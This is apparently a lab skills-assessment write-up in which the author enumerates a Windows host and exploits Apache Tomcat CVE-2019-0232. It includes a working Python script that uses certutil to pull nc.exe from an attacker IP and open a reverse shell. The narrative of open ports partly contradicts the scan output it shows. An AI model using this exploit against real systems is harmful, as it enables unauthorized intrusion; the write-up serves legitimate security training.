# Penetration Test for Inlanefreight: Attacking Common Applications

## Introduction
Inlanefreight, a company focused on logistics, presents a robust security posture with a well-hardened network. During the penetration test, after performing thorough enumeration, I encountered a host of particular interest that could potentially be leveraged to gain an initial foothold into the network. The goal of this portion of the skills assessment was to identify vulnerable applications running on the target host, exploit any weaknesses found, and gain access to the flag.txt file to complete the challenge.

## Enumerating the Target Host
The first step in any penetration test is to enumerate the target system and identify any potential vulnerabilities or weak points in its security. Given that the network was well-secured, I employed various enumeration techniques to gather information on the target host:

**1. Network Scanning:**
I performed a network scan using tools such as Nmap to identify open ports and services running on the target machine. The goal was to gather information on potential vulnerable applications that could be exploited.
```bash
nmap -sS -T4 -p- 10.129.76.189
```

This Nmap scan revealed several open ports, including ports for HTTP (80), HTTPS (443), and SSH (22). The presence of an HTTP/HTTPS service indicated a web application that could potentially be vulnerable to common web application flaws.

**2. Service Version Detection:**

To gather more specific information about the services running on the target, I performed service version detection to identify the exact versions of the software. This was done using the following Nmap command:
```bash
nmap -sV 10.129.76.189
```
The scan showed that the target was running Apache Tomcat 9.0.0.M1 on port 8080, which is a well-known application server that may have potential vulnerabilities, including the CVE-2019-0232 remote code execution vulnerability.

**Output:**
```bash
sudo nmap -sV -sC 10.129.76.189
[sudo] password for manoj: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 16:14 AEST
Nmap scan report for 10.129.76.189
Host is up (0.32s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_09-01-21  08:07AM       <DIR>          website_backup
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Freight Logistics, Inc
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-06T06:14:56+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: APPS-SKILLS1
|   NetBIOS_Domain_Name: APPS-SKILLS1
|   NetBIOS_Computer_Name: APPS-SKILLS1
|   DNS_Domain_Name: APPS-SKILLS1
|   DNS_Computer_Name: APPS-SKILLS1
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-06T06:14:47+00:00
| ssl-cert: Subject: commonName=APPS-SKILLS1
| Not valid before: 2025-05-05T06:13:32
|_Not valid after:  2025-11-04T06:13:32
8000/tcp open  http          Jetty 9.4.42.v20210604
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.42.v20210604)
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-06T06:14:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.94 seconds
```

![image](https://github.com/user-attachments/assets/60bb5dbd-f4aa-4f0d-8b6f-f3f1cb398cf2)

## Identifying Vulnerable Applications
During the enumeration phase, I focused on identifying any applications or services that might be vulnerable to known exploits. One such service was **Apache Tomcat**, which was running **version 9.0.0.M1**. After researching this version, I found that it was vulnerable to **CVE-2019-0232**, a remote code execution vulnerability in Tomcat's CGI scripts on Windows systems.

This vulnerability can be exploited by sending crafted HTTP requests to the Tomcat server that invoke the `cmd.bat` script, allowing an attacker to execute arbitrary commands on the server. With this in mind, I began the exploitation process.

## Exploiting Apache Tomcat CVE-2019-0232
To exploit the vulnerability in Apache Tomcat, I used a custom Python script that leverages the certutil tool to download and execute Netcat on the target machine. This allows the attacker to obtain a reverse shell and gain control of the system.

Below is the script I used for exploitation:
```bash
#!/usr/bin/env python3
import time
import requests

# ================== USER CONFIGURATION ================== #
target_host = '10.129.76.189'     # Victim IP (Apache Tomcat CGI vulnerable host)
target_port = '8080'               # Apache Tomcat HTTP port

attacker_ip = '10.10.14.64'        # Your IP (attacker box)
attacker_http_port = '80'         # Port where you're serving nc.exe
listener_port = '1234'            # Port where you're listening with nc
# ======================================================== #

# Build the payload to download nc.exe using certutil
url1 = f"http://{target_host}:{target_port}/cgi/cmd.bat?" \
       f"&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+" \
       f"http%3A%2F%2F{attacker_ip}%3A{attacker_http_port}%2Fnc.exe+nc.exe"

# Build the payload to execute nc.exe and get a reverse shell
url2 = f"http://{target_host}:{target_port}/cgi/cmd.bat?" \
       f"&nc.exe+{attacker_ip}+{listener_port}+-e+cmd.exe"

print("[*] Sending payload to download nc.exe...")
response1 = requests.get(url1)
print(f"[+] URL1 Response Code: {response1.status_code}")

# Wait a bit to let the victim download nc.exe
time.sleep(2)

print("[*] Sending payload to execute nc.exe for reverse shell...")
response2 = requests.get(url2)
print(f"[+] URL2 Response Code: {response2.status_code}")

print("[*] Exploit triggered. Check your Netcat listener.")
```
![image](https://github.com/user-attachments/assets/70181b78-7c51-4a5e-bee3-981c438e66b4)

![image](https://github.com/user-attachments/assets/aa04a2e0-3357-4c5c-aa8f-07746c756a9e)


**Explanation of the Script:**

**Payload URL 1**: This URL triggers the `cmd.bat` script on the Tomcat server and uses certutil to download Netcat (`nc.exe`) from the attacker's server.

**Payload URL 2**: This second URL executes the downloaded Netcat and establishes a reverse shell back to the attacker's machine on port 1234.

## Setting Up the Listener
Before running the exploit script, I set up a Netcat listener on my local machine to receive the reverse shell connection:
```bash
nc -lvnp 1234
```
Once the script successfully executed the reverse shell payload, a connection was established to my listener, granting me access to the target machine.

![image](https://github.com/user-attachments/assets/9a9ec0c6-6a2c-4432-8dea-6c7416259945)

**Note:** You have to download `nc.exe` file and put in the same folder where vulnerable script is. 


## Gaining Access and Retrieving the Flag
With the reverse shell established, I was able to navigate the system's file structure. The goal was to find the flag.txt file, which was located on the Administrator's desktop. Using the following command, I accessed the file:
```bash
cat C:\Users\Administrator\Desktop\flag.txt
```
The contents of the `flag.txt` file were successfully retrieved and submitted to complete the assessment.

## Conclusion
This penetration test demonstrated how an attacker could exploit a vulnerability in Apache Tomcat to gain unauthorized access to a system. By identifying the CVE-2019-0232 vulnerability in the target's Tomcat instance, I was able to leverage a custom script to execute arbitrary commands and gain a reverse shell. Once access was obtained, I was able to retrieve the flag.txt file and complete the skills assessment.

The process highlights the importance of keeping web application servers like Apache Tomcat up to date with security patches, as well as securing services from unauthorized access by applying the principle of least privilege and isolating sensitive systems.



